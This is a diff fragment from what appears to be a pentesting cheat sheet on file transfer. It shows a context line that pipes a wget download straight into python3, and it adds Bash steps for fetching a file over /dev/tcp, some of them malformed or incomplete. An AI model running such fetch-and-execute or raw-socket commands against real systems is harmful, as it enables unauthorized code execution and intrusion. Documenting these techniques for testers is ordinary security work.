@@ -50,5 +50,14 @@ wget -qO- <URL TO FILE> | python3
 ---
 ## Download File with Bash (/dev/tcp)
 
+#### 1) Connect to Target Webserver
+```bash
+exec 3<>/dev/tcp<IP>/<PORT (usually 80 or 443)>
+```
+
+#### 2) HTTP GET Request
+```bash
+echo -e "GET <>"
+```
 
 
